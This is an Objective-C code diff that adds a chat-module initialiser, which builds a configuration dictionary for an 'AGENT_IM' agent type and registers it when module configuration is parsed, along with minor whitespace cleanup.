@@ -726,11 +726,49 @@ typedef struct _message_config_t {
   [pool release];
 }
 
+- (void)initChatModule: (NSDictionary *)aModule
+{
+  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
+  
+  id enabled = AGENT_ENABLED;
+  NSArray *keys = nil;
+  NSArray *objects = nil;
+  
+  NSMutableDictionary *moduleConfiguration = [[NSMutableDictionary alloc] init];
+  
+  NSNumber *type = [NSNumber numberWithUnsignedInt: AGENT_IM];
+  NSNumber *status = [aModule objectForKey: MODULES_STATUS_KEY];
+  
+  if (status == nil || [status boolValue] == FALSE)
+    enabled = AGENT_DISABLED;
+  
+  keys = [NSArray arrayWithObjects: @"agentID",
+                                    @"status",
+                                    @"data",
+                                    nil];
+  
+  objects = [NSArray arrayWithObjects: type,
+                                       enabled,
+                                       MODULE_EMPTY_CONF,
+                                       nil];
+  
+  NSDictionary *dictionary = [NSDictionary dictionaryWithObjects: objects
+                                                         forKeys: keys];
+  
+  [moduleConfiguration addEntriesFromDictionary: dictionary];
+  
+  [mAgentsList addObject: moduleConfiguration];
+  
+  [moduleConfiguration release];
+  
+  [pool release];
+}
+
 - (void)parseAndAddModules:(NSDictionary *)dict
-{  
+{
   NSArray *modulesArray = [dict objectForKey: MODULES_KEY];
   
-  if (modulesArray == nil) 
+  if (modulesArray == nil)
     {
       return;
     }
@@ -797,6 +835,10 @@ typedef struct _message_config_t {
           {
             [self initPositionModule: module];
           }
+        else if ([moduleType compare: MODULES_CHAT_KEY] == NSOrderedSame)
+        {
+          [self initChatModule: module];
+        }
       }
     
     [inner release];
